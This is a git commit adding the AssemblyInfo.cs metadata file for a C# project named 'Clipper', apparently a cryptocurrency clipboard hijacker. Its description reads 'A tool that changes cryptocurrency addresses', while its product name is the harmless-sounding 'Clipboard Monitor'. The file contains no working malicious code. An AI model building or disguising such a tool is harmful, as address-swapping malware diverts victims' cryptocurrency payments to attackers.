3bffb3b28b9885ab08aa3470820b2a3d18a6bde7
Denis T. <deadspell21391@gmail.com>
2025-10-22 20:59:05 +0200

    AssemblyInfo.cs

---
+++ Clipper/Properties/AssemblyInfo.cs
@@ -0,0 +1,17 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+
+[assembly: AssemblyTitle("Crypto Clipboard")]
+[assembly: AssemblyDescription("A tool that changes cryptocurrency addresses.")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("unknown")]
+[assembly: AssemblyProduct("Clipboard Monitor")]
+[assembly: AssemblyCopyright("Copyright © 2025")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("CE2795CF-97C8-40EB-A740-25FCD113A307")]
+[assembly: AssemblyVersion("1.72.152.3295")]
+[assembly: AssemblyFileVersion("1.72.152.3295")]
